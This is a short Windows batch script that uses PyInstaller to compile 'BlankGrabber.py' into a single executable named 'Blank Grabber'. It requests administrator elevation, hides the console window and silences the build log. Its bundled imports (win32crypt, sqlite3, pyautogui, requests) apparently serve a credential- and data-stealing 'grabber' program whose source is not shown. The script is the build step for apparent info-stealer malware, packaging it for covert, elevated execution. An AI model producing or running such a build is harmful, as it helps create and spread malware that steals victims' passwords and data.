@echo off
title Converting to exe...
pyinstaller --clean --onefile BlankGrabber.py --noconsole --uac-admin --hidden-import=requests  --hidden-import=psutil --hidden-import=pyautogui --hidden-import=sqlite3 --hidden-import=win32crypt --noconfirm --log-level CRITICAL --name "Blank Grabber"
cls
echo Done! (press any key to exit)
pause >> NUL